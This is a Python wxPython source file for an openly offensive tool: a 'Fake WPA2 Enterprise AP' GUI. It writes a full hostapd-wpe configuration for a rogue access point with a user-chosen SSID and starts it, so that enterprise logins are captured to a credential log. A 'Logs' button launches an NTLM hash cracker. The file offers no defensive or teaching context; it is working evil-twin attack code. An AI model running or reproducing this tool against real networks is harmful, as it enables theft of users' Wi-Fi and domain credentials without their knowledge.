import os
import os.path
import time
import wx

import wless_commands


class SnifferGUI(wx.Frame):
    def __init__(self, parent, title):
        super(SnifferGUI, self).__init__(parent, title=title, size=(350, 350))

        self.InitUI()
        self.Centre()
        self.Show()

    def InitUI(self):
        panel = wx.Panel(self)
        panel.SetBackgroundColour('#4f5049')

        self.APname = wx.TextCtrl(panel, -1, "Enter the name of Fake AP", size=(250, 30), pos=(10, 20))

        self.nDeviceList = wx.ComboBox(panel, -1, value='Select Attack Interface', size=(200, 30), pos=(10, 115),
                                       choices=wless_commands.get_net_devices())

        self.actionButton = wx.Button(panel, -1, label='Create Fake AP', pos=(10, 210))
        self.stopButton = wx.Button(panel, -1, label='Stop Fake AP', pos=(130, 210))
        self.logButton = wx.Button(panel, -1, label='Logs', pos=(10, 250))

        self.closeButton = wx.Button(panel, -1, label='Close', pos=(130, 250))

        self.myLabel = wx.StaticText(panel, -1, label='', pos=(10, 180))

        self.actionButton.Bind(wx.EVT_BUTTON, self.executeCommand)
        self.stopButton.Bind(wx.EVT_BUTTON, self.stopfakeap)
        self.closeButton.Bind(wx.EVT_BUTTON, self.closeMe)
        self.logButton.Bind(wx.EVT_BUTTON, self.openLogs)

    # ~ self.on_timer()
    def closeMe(self, e):
        self.Close()

    def openLogs(self, e):
        import ntlm_hashes
        ntlm_hashes.launch_ntlm_cracker()

    def stopfakeap(self, e):
        os.system("kill  `ps aux | grep hostapd-wpe | head -1 | awk '{print $2}'`")
        # ~ os.system("kill  `ps aux | grep radiusd | head -1 | awk '{print $2}'`")

        # ~ os.system("kill  `ps aux | grep dnsmasq | head -1 | awk '{print $2}'`")
        wx.MessageBox('Fake SSID is Stopped', 'Info', wx.OK | wx.ICON_INFORMATION)

    def executeCommand(self, e):
        attackInterface = self.nDeviceList.GetValue()
        fakeAPName = self.APname.GetValue()

        self.myLabel.SetLabel("Created Fake AP: " + str(fakeAPName))

        configuration = """interface=%s
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
ssid=%s
channel=1
eap_server=1
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
ieee8021x=1
pac_key_lifetime=604800
pac_key_refresh_time=86400
pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
ctrl_interface=/var/run/hostapd-wpe
ctrl_interface_group=0
hw_mode=g
beacon_int=100
dtim_period=2
max_num_sta=255
rts_threshold=-1
fragm_threshold=-1
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0
wmm_enabled=1
wmm_ac_bk_cwmin=4
wmm_ac_bk_cwmax=10
wmm_ac_bk_aifs=7
wmm_ac_bk_txop_limit=0
wmm_ac_bk_acm=0
wmm_ac_be_aifs=3
wmm_ac_be_cwmin=4
wmm_ac_be_cwmax=10
wmm_ac_be_txop_limit=0
wmm_ac_be_acm=0
wmm_ac_vi_aifs=2
wmm_ac_vi_cwmin=3
wmm_ac_vi_cwmax=4
wmm_ac_vi_txop_limit=94
wmm_ac_vi_acm=0
wmm_ac_vo_aifs=2
wmm_ac_vo_cwmin=2
wmm_ac_vo_cwmax=3
wmm_ac_vo_txop_limit=47
wmm_ac_vo_acm=0
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
wpe_logfile=wpe-creds.log
""" % (attackInterface, fakeAPName)

        hostapd_conf = open('./Modules/hostapd-wpe.conf', 'wb')
        hostapd_conf.write(configuration)
        hostapd_conf.close()
        # ~ os.system("/sbin/ldconfig -v")
        # ~ os.system("gnome-terminal -- radiusd -X &")
        # ~ os.system("/usr/local/etc/raddb/certs/bootstrap &")
        time.sleep(2)
        os.system("gnome-terminal -- hostapd-wpe ./Modules/hostapd-wpe.conf &")
        wx.MessageBox('WPA2 Enterpise attack started', 'Info', wx.OK | wx.ICON_INFORMATION)


# ~ if __name__ == '__main__':

def main():
    app = wx.App(False)
    frame = SnifferGUI(None, 'Fake WPA2 Enterprise AP')
    app.MainLoop()

# ~ main()
